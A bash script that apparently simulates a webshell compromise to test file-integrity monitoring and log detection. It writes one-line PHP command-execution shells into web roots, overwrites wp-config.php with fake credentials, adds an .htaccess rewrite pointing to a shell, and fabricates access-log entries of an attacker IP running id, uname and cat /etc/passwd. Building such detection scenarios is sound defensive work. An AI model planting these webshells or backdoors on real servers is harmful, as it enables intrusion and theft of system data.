#!/bin/bash
SCRIPT_DIR="$(cd "$(dirname "$0")/.." && pwd)"
source "$SCRIPT_DIR/orchestrator.conf"
source "$SCRIPT_DIR/inject-common.sh"

ATTACKER_IP="10.0.0.110"
DOMAIN="domain1.ac.id"
WEB_ROOT="/home/${DOMAIN}/public_html"
COUNT=$(get_attack_lines)

# Create webshell files
for ((i=1; i<=3; i++)); do
    inject_file_write "$AGENTS_SHARED" "${WEB_ROOT}/shell${i}.php" \
        "<?php system(\$_GET['cmd']); ?>"
    inject_apache_access "$AGENTS_SHARED" "$DOMAIN" "$ATTACKER_IP" "POST" "/shell${i}.php" "200" "curl/7.88.1"
    inject_apache_access "$AGENTS_SHARED" "$DOMAIN" "$ATTACKER_IP" "GET" "/shell${i}.php?cmd=id" "200" "curl/7.88.1"
    inject_apache_access "$AGENTS_SHARED" "$DOMAIN" "$ATTACKER_IP" "GET" "/shell${i}.php?cmd=uname+-a" "200" "curl/7.88.1"
done

# Tamper wp-config.php
inject_file_write "$AGENTS_SHARED" "${WEB_ROOT}/wp-config.php" \
    "<?php
define('DB_NAME', 'wordpress_domain1');
define('DB_USER', 'wp_user_1');
define('DB_PASSWORD', 'compromised_pass123');
define('WP_HOME', 'http://domain1.ac.id');
define('WP_SITEURL', 'http://domain1.ac.id');
\$secret = 'S0me0ne_changed_this';
"

# Upload backdoor access log
inject_file_write "$AGENTS_SHARED" "${WEB_ROOT}/.htaccess" \
    "<IfModule mod_rewrite.c>
RewriteEngine On
RewriteRule ^shell /shell1.php [L]
</IfModule>"

# Simulate attacker browsing after webshell
for ((i=0; i<COUNT-6; i++)); do
    inject_apache_access "$AGENTS_SHARED" "$DOMAIN" "$ATTACKER_IP" "GET" "/shell1.php?cmd=cat+/etc/passwd" "200" "curl/7.88.1"
done

# Multi-site - webshell di labs.ac.id
MS_ROOT="/home/labs.ac.id/public_html"
inject_file_write "$AGENTS_MULTI" "${MS_ROOT}/backdoor.php" "<?php system(\$_GET['cmd']); ?>"
inject_apache_access "$AGENTS_MULTI" "labs.ac.id" "$ATTACKER_IP" "GET" "/backdoor.php?cmd=id" "200" "curl/7.88.1"
inject_apache_access "$AGENTS_MULTI" "labs.ac.id" "$ATTACKER_IP" "GET" "/backdoor.php?cmd=uname+-a" "200" "curl/7.88.1"
for ((i=0; i<COUNT/4; i++)); do
    inject_apache_access "$AGENTS_MULTI" "labs.ac.id" "$ATTACKER_IP" "GET" "/backdoor.php?cmd=cat+/etc/passwd" "200" "curl/7.88.1"
done

log_orch "scenario=fim-webshell files=3+1+1+1 lines=$((COUNT + COUNT/4 + 3)) attacker=${ATTACKER_IP}"
